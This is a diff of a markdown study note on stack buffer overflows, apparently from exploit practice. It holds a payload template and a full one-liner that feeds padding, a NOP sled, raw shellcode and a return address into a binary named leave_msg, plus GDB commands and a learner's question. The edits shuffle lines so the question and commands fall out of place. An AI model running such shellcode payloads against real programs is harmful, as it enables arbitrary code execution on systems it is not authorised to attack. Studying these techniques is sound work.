@@ -32,11 +32,6 @@ Hint 3: Running the payload with the binary
 (python -c "print('\x90'*(fill in the number) + (shellcode) + 'A'*(fill in the number)
 +(return address))";cat) | ./bof64
 
-
-
-
-Use python2 !
-
 ```console
 Running Payload outside GDB
 $ ./leave_msg $(python -c "print '\x55' * 1841 + '\x90' * 124 + '\xda\xc3\xb8\x7d\x24\xf0\x6e\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x12\x83\xea\xfc\x31\x42\x13\x03\x3f\x37\x12\x9b\x8e\xec\x25\x87\xa3\x51\x99\x22\x41\xdf\xfc\x03\x23\x12\x7e\xf0\xf2\x1c\x40\x3a\x84\x14\xc6\x3d\xec\xd9\x38\xbe\xed\x4d\x3b\xbe\xfc\xd1\xb2\x5f\x4e\x8f\x94\xce\xfd\xe3\x16\x78\xe0\xc9\x99\x28\x8a\xbf\xb6\xbf\x22\x28\xe6\x10\xd0\xc1\x71\x8d\x46\x41\x0b\xb3\xd6\x6e\xc6\xb4' + '\x2c\xd7\xff\xff'")
@@ -59,16 +54,15 @@ $ ./leave_msg $(python -c "print '\x55' * 1841 + '\x90' * 124 + '\xda\xc3\xb8\x7
 
 ```console
 $ echo $(python -c 'print("A" * 650)') | ./bof
-Enter some string:
-Segmentation fault (core dumped)
+(gdb) run $(python -c 'print("A" * 650)')
+(gdb) r < <(python -c 'print("A" * 650)')
 ```
 
 ## Using GDB
 Hello there can anyone explain me the difference between these to commands? Sometime the first one is working and sometimes only the second one 
 
 ```console
-(gdb) run $(python -c 'print("A" * 650)')
-(gdb) r < <(python -c 'print("A" * 650)')
+
 ```
 
 ```console
